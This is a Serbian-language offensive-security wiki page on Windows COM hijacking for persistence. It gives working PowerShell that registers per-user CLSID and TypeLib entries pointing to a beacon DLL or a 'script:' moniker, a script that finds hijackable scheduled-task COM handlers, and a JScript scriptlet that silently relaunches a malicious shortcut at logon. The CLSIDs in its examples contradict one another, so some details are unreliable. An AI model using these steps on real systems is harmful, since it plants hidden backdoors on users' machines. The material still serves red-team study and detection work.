# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Traženje nepostojećih COM komponenti

Pošto vrednosti HKCU mogu biti izmenjene od strane korisnika, **COM Hijacking** se može koristiti kao **trajni mehanizam**. Korišćenjem `procmon` lako je pronaći pretraživane COM registry zapise koji ne postoje, a koje napadač može kreirati da bi ostvario perzistenciju. Filteri:

- **RegOpenKey** operacije.
- gde je _Result_ **NAME NOT FOUND**.
- i _Path_ se završava sa **InprocServer32**.

Kada odlučite koji nepostojeći COM želite da imitirate, izvršite sledeće komande. _Budite oprezni ako odlučite da imitirate COM koji se učitava na svakih nekoliko sekundi, jer to može biti preterano._
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Hijackable Task Scheduler COM components

Windows Tasks koriste Custom Triggers za pozivanje COM objekata, i pošto se izvršavaju preko Task Scheduler-a, lakše je predvideti kada će biti pokrenuti.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

Proverom izlaza možete, na primer, odabrati onaj koji će se izvršavati **svaki put kada se korisnik prijavi**.

Ako sada potražite CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** u **HKEY\CLASSES\ROOT\CLSID** i u HKLM i HKCU, obično ćete otkriti da ta vrednost ne postoji u HKCU.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
Zatim možete jednostavno napraviti HKCU unos i svaki put kada se korisnik prijavi, vaš backdoor će biti pokrenut.

---

## COM TypeLib Hijacking (script: moniker persistence)

Type Libraries (TypeLib) definišu COM interfejse i učitavaju se preko `LoadTypeLib()`. Kada se COM server instancira, OS može takođe učitati povezani TypeLib konsultujući registry ključeve pod `HKCR\TypeLib\{LIBID}`. Ako je TypeLib putanja zamenjena sa **moniker**, npr. `script:C:\...\evil.sct`, Windows će izvršiti scriptlet kada se TypeLib razreši – što dovodi do stealthy persistence koja se aktivira kada su uobičajene komponente dodirnute.

Ovo je primećeno protiv the Microsoft Web Browser control (često učitavanog od strane Internet Explorer, aplikacija koje ugrađuju WebBrowser, pa čak i `explorer.exe`).

### Koraci (PowerShell)

1) Identifikujte TypeLib (LIBID) koji koristi CLSID visoke frekvencije. Primer CLSID koji često zloupotrebljavaju malware chains: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).
```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```
2) Usmerite per-user TypeLib putanju na lokalni scriptlet koristeći `script:` moniker (nije potrebna admin prava):
```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```
3) Postavite minimalni JScript `.sct` koji ponovo pokreće vaš primarni payload (npr. `.lnk` koji je korišćen u inicijalnom lancu):
```xml
<?xml version="1.0"?>
<scriptlet>
<registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
<script language="JScript">
<![CDATA[
try {
var sh = new ActiveXObject('WScript.Shell');
// Re-launch the malicious LNK for persistence
var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
sh.Run(cmd, 0, false);
} catch(e) {}
]]>
</script>
</scriptlet>
```
4) Pokretanje – otvaranje IE, aplikacije koja ugrađuje WebBrowser control, ili čak rutinska aktivnost Explorer-a će učitati TypeLib i izvršiti scriptlet, ponovo aktivirajući vaš lanac pri logon/reboot.

Čišćenje
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```
Napomene
- Istu logiku možete primeniti na druge COM komponente koje se često koriste; uvek prvo razrešite stvarni `LIBID` iz `HKCR\CLSID\{CLSID}\TypeLib`.
- Na 64-bit sistemima takođe možete popuniti `win64` podključ za 64-bit potrošače.

## References

- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)

{{#include ../../banners/hacktricks-training.md}}
